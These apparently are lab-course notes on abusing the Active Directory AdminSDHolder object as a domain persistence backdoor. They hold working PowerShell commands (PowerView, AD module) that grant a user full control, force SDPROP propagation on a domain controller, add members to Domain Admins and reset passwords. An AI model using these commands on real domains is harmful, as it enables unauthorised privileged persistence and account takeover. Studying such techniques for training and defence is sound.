# Admin Security Descriptor 

- Resides in the System container of a domain and used to control the permissions - using an ACL - for certain built-in privileged groups ( called Protected Groups).
- Security Descriptor Propagator **(SDPROP) runs every 60mins** and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL.

# Protected groups

|	|	|
| -- | -- |
| Account Operators | Enterprise Admins |
| Backup Operators | Domain Controllers |
| Server Operators | Read-only Domain Controllers |
| Print Operators |  Schema Admins |
| Domain Admins | Administrators |
| Replicator | |


# Groups that can log on locally to DC

| Well known abuse of some of the Protected Groups | Description |
| -- | -- |
| Account Operators |  Cannot modify DA/EA/BA groups. Can modify nested group within these groups.| 
| Backup Operators | Backup GPO, edit to add SID of controlled account to a privileged group and Restore. |
| Server Operators | Run a command as system (using the disabled Browser service) |
| Print Operators | Copy ntds.dit backup, load device drivers. |

# How to exploit
- With DA privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object.
- In 60 minutes (when SDPROP runs), the user will be added with Full Control to the AC of groups like Domain Admins without actually being a member of it.

# Invoke-SDPropagator
When this is executed, whatever that is in the ACL of `AdminSDPHolder` will be propagated to all the protected groups.
```powershell
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
```

# Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA:
```powershell
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student1 -Rights All -Verbose
```


| different type of -Rights | |
| -- |  -- |
| All |  ResetPassword |
| WriteMembers | | 

# Using ActiveDirectory Module and Set-ADACL:

```powershell
Import-Module .\ADModule-master\Microsoft.ActiveDirectory.Management.dll

Import-Module .\ADModule-master\ActiveDirectory\ActiveDirectory.psd1

. .\Set-ADACL.ps1 

Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Principal student1 -Verbose
```

Now run the propagation remotely.

```powershell
$sess = New-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local

Invoke-Command -FilePath .\Invoke-SDPropagator.ps1 -Session $sess

Enter-PSSession -Session $sess

> Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose

# or for pre-Server 2008 machines
Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose

```

Check ACL of domain admin to see if successful

```powershell
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'student1'}

# or using ActiveDirectory module
(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access | ?{$_.IdentityReference -match 'student1'}
```

Test if we can add user
```powershell
Add-ADGroupMember -Identity 'Domain Admins' -Members testda
```

## Abusing ResetPassword 
Using PowerView_dev:
```powershell
Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```

Using ActiveDirectory Module:
```powershell
Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```
